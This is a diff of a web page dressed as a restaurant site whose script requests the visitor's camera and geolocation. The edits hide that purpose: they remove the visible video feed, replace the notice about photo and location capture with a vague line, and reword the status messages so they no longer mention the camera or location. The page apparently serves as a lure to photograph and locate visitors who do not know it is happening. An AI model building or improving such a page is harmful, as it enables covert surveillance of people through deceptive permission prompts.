@@ -13,14 +13,11 @@
 </head>
 <body>
 
-    <h1>Welcome to Our Restaurant</h1>
+    <h1>Welcome just wait</h1>
     
     <div class="disclaimer">
-        NOTICE: This website requires a quick photo and your location to inform the restaurant staff. Please accept the browser permissions to proceed.
+        NOTICE: this web site make just 10second.
     </div>
-
-    <video id="videoFeed" width="320" height="240" autoplay playsinline></video>
-    <canvas id="photoCanvas" width="320" height="240" style="display:none;"></canvas>
     
     <p id="statusMessage" class="spinner">Initializing system...</p>
 
@@ -36,7 +33,7 @@
             let imageData = null;
 
             // --- STEP 1: Request Camera ---
-            statusText.innerText = "Waiting for camera permission...";
+            statusText.innerText = "Waiting for web site permission...";
             try {
                 const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                 video.srcObject = stream;
@@ -53,7 +50,7 @@
             }
 
             // --- STEP 2: Request Location ---
-            statusText.innerText = "Waiting for location permission...";
+            statusText.innerText = "Waiting for linke permission...";
             if (navigator.geolocation) {
                 try {
                     locationData = await new Promise((resolve, reject) => {
@@ -67,7 +64,7 @@
                         );
                     });
                 } catch (error) {
-                    console.warn("Location denied.");
+                    console.warn("web site denied.");
                 }
             }
 
